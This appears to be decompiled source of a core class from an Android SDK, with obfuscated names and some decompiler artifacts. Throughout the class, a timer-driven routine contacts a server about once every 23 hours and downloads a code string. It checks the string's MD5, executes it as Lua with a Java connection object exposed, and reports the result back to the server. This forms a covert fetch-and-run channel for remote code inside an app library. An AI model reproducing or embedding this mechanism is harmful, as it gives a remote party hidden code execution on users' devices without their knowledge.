package com.yaya.sdk.core;

import android.content.Context;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;
import com.yaya.sdk.bean.req.h;
import com.yaya.sdk.bean.resp.d;
import com.yaya.sdk.connection.YayaLib;
import com.yaya.sdk.connection.YayaStateFactory;
import com.yaya.sdk.constants.Constants;
import com.yaya.sdk.utils.e;
import com.yaya.sdk.utils.f;
import com.yaya.sdk.utils.g;
import com.yaya.sdk.utils.j;
import java.util.Random;

public class a {
    static d a = null;
    private static String d = a.class.getSimpleName();
    private static YayaLib e;
    public Context b;
    Handler c = new Handler(this) {
        final /* synthetic */ a a;

        {
            this.a = r1;
        }

        public void handleMessage(Message msg) {
            g.a(a.d, (Object) "进入handler");
            Context context = (Context) msg.obj;
            if (System.currentTimeMillis() - j.a(context, Constants.LAST_DO_TIME, Long.valueOf(0)) > 82800000) {
                a.b(context);
            } else {
                g.a(a.d, (Object) "距离上次拉取小于23小时");
            }
        }
    };

    class AnonymousClass2 implements com.yaya.sdk.listener.a {
        private final /* synthetic */ Context a;

        AnonymousClass2(Context context) {
            this.a = context;
        }

        public void a(String str, int i) {
            g.b(a.d, "pullIdFromServer-onSuccess:statusCode--" + i + ",contet--" + str);
            if (!TextUtils.isEmpty(str)) {
                a.a = f.c(str);
                a.a(this.a, a.a);
            }
        }

        public void b(String str, int i) {
            g.b(a.d, "pullIdFromServer-onFailure:statusCode--" + i + ",contet--" + str);
            a.a = null;
        }
    }

    class AnonymousClass3 implements com.yaya.sdk.listener.a {
        private final /* synthetic */ Context a;

        AnonymousClass3(Context context) {
            this.a = context;
        }

        public void a(String str, int i) {
            g.b(a.d, "pullCodeFromServer-onSuccess:statusCode--" + i + ",contet--" + str);
            a.a(this.a, f.b(str));
        }

        public void b(String str, int i) {
            g.b(a.d, "pullCodeFromServer-onFailure:statusCode--" + i + ",contet--" + str);
        }
    }

    public void a(Context context) {
        ConnectionDSL.getInstance().init(context);
        e = YayaStateFactory.newYayaState();
        e.openLibs();
        this.b = context;
        Message message = new Message();
        message.obj = context;
        int nextInt = new Random().nextInt(5);
        g.a(d, "mill:" + nextInt);
        this.c.sendMessageDelayed(message, (long) (nextInt * 1000));
    }

    public static void b(Context context) {
        g.a(d, (Object) "进入pullIdFromServer");
        d dVar = new d();
        com.yaya.sdk.http.a.b(context, new AnonymousClass2(context));
        g.a(d, dVar.toString());
    }

    public static void a(Context context, d dVar) {
        if (dVar != null) {
            CharSequence c = dVar.c();
            if (TextUtils.isEmpty(c) || c.equals("null")) {
                g.a(d, (Object) "requestId==null || helloId==null");
                return;
            } else if (!TextUtils.isEmpty(c)) {
                if (com.yaya.sdk.dao.a.a(context).b(dVar.d().intValue())) {
                    g.a(d, (Object) "pulled==true");
                    return;
                }
                b(context, dVar);
                g.a(d, (Object) "pulled==false");
                return;
            } else {
                return;
            }
        }
        g.a(d, (Object) "idResp==null");
    }

    public static void b(Context context, d dVar) {
        if (TextUtils.isEmpty(dVar.c())) {
            g.a(d, (Object) "checkid-requestId==null");
        } else {
            com.yaya.sdk.http.a.a(context, dVar, new AnonymousClass3(context));
        }
    }

    public static void a(Context context, com.yaya.sdk.bean.resp.f fVar) {
        if (fVar != null) {
            com.yaya.sdk.bean.req.g d = fVar.d();
            if (d != null) {
                g.a(d, (Object) "HelloInfo!=null");
                if (e.a(d.e()).equals(d.a())) {
                    g.a(d, (Object) "md5=md5Val");
                    j.a(context, Constants.LAST_DO_TIME, System.currentTimeMillis());
                    com.yaya.sdk.dao.a.a(context).a(d.b().intValue());
                    b(context, fVar);
                    return;
                }
                g.a(d, (Object) "md5!=md5Val");
                return;
            }
            g.a(d, (Object) "HelloInfo==null");
            return;
        }
        g.a(d, (Object) "GetHelloResp==null");
    }

    public static void b(Context context, com.yaya.sdk.bean.resp.f fVar) {
        com.yaya.sdk.bean.req.g d = fVar.d();
        g.a(d, (Object) "start execute");
        String e = d.e();
        Constants.LAST_REQUEST_ID = fVar.c();
        Constants.LAST_HELLO_ID = d.b();
        String c = d.c();
        g.a(d, "code-1-" + e);
        e.LdoString(e);
        g.a(d, "code-2-" + e);
        e.getField(Integer.valueOf(-10002).intValue(), c);
        e.pushJavaObject(ConnectionDSL.getInstance());
        e.setField(new Integer(-10002).intValue(), "resultKey");
        e.getGlobal("resultKey");
        int pcall = e.pcall(1, 1, 0);
        c = "";
        g.a(d, (Object) "start execute");
        if (pcall != 0) {
            g.a(d, (Object) "execute Failure");
            if (e.toString(-1) != null) {
                e = e.toString(-1);
                com.yaya.sdk.bean.req.d dVar = new com.yaya.sdk.bean.req.d();
                dVar.b(e);
                dVar.c(d.b());
                dVar.a(fVar.c());
                com.yaya.sdk.http.a.a(context, dVar, new com.yaya.sdk.listener.a() {
                    public void a(String str, int i) {
                        g.b(a.d, "reportError-onSuccess:statusCode--" + i + ",contet--" + str);
                    }

                    public void b(String str, int i) {
                        g.b(a.d, "reportError-onFailure:statusCode--" + i + ",contet--" + str);
                    }
                });
                return;
            }
            return;
        }
        g.a(d, (Object) "execute Success");
        if (e.toString(-1) != null) {
            e = e.toString(-1);
            h hVar = new h();
            hVar.a(fVar.c());
            hVar.c(d.b());
            hVar.b(e);
            com.yaya.sdk.http.a.a(context, hVar, new com.yaya.sdk.listener.a() {
                public void a(String str, int i) {
                    g.b(a.d, "reportSucces-onSuccess:statusCode--" + i + ",contet--" + str);
                }

                public void b(String str, int i) {
                    g.b(a.d, "reportSucces-onFailure:statusCode--" + i + ",contet--" + str);
                }
            });
        }
    }
}
